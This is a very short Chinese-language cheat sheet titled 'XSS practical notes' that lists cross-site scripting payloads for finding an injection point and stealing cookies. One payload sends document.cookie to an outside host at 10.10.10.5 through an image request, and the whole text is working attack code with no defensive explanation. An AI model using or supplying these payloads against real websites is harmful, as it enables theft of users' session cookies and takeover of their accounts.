# XSS 实战小记

-  寻找注入点

```
<script>alert(1)</script>
```

-  获取 Cookie

```
<script>alert(document.cookie)</script>

<script>new Image().src="http://10.10.10.5/?c="+document.cookie;</script>
```